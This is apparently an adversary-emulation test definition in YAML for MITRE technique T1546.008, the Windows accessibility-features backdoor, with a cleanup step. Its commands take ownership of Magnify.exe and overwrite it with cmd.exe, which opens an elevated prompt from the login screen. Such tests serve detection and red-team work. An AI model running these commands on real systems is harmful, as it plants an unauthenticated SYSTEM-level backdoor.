- id: 99b0527c-cd0f-5951-8b3b-61cf6a6a71df
  name: Soumaia ART Tests - Replace Magnify.exe (Magnifier binary) with cmd.exe
  description: Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen. (requires elevation)
  tactic: privilege-escalation
  technique:
    attack_id: T1546.008
    name: 'Event Triggered Execution: Accessibility Features'
  platforms:
    windows:
      cmd:
        command: |-
          IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
          takeown /F C:\Windows\System32\Magnify.exe /A
          icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
        cleanup: |-
          copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
